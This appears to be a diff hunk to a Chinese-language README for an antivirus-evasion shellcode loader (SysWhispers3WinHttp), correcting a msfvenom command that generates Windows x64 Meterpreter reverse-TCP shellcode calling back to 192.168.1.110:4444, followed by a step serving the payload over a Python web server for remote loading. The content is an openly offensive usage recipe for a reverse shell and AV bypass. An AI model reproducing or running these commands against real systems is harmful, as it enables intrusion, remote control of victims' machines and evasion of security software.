@@ -12,7 +12,7 @@ SysWhispers3WinHttp 基于SysWhispers3增添WinHttp分离加载，可免杀360�
 
 ```
 // 1. 使用msfvenom生成Shellcode（或使用CobaltStrike生成Stageless之Shellcode）
-msfvenom -p windows/x64/meterpreter/reverse lhost=192.168.1.110 lport=4444 -f raw -o beacon.bin
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.110 lport=4444 -f raw -o beacon.bin
 
 // 2. 使用python3开启Web服务（或使用CobaltStrike之Host File功能）
 python3 -m http.server
